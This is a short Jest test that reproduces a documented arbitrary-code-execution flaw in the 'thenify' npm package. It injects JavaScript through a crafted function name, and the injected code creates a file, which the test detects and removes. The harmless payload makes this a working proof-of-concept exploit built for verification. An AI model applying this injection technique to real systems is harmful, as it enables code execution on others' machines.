//https://security.snyk.io/vuln/SNYK-JS-THENIFY-571690
test("Arbitrary code execution in thenify", () => {
  const fs = require("fs");
  const a = require("thenify");
  const path = "./thenify";
  let payload = "fs=require('fs');fs.writeFileSync('thenify','',)";
  data = {};

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    function cur() {}
    Object.defineProperty(cur, "name", {
      value: "fake() {" + payload + ";})();(function(){//",
    });
    a(cur);
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
